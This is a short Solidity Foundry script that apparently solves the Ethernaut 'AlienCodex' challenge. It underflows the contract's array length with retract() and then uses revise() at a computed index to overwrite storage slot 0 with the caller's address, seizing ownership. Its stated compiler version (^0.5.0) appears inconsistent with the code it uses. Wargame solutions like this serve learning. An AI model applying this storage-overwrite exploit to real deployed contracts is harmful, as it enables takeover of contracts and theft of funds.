// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;
import "../src/AlienCodex.sol";
import "forge-std/Script.sol";

contract AlienCodexSolution is Script {
    AlienCodex AlienCodexInstance = AlienCodex(payable(0x311c1440B20Fb5D48a501e1Dc1593a2cC24B1eA9));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AlienCodexInstance.retract();
        uint256 i = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(2))));
        bytes32 _content = bytes32(uint256(uint160(msg.sender)));
        AlienCodexInstance.revise(i, _content);
        vm.stopBroadcast();
    }
}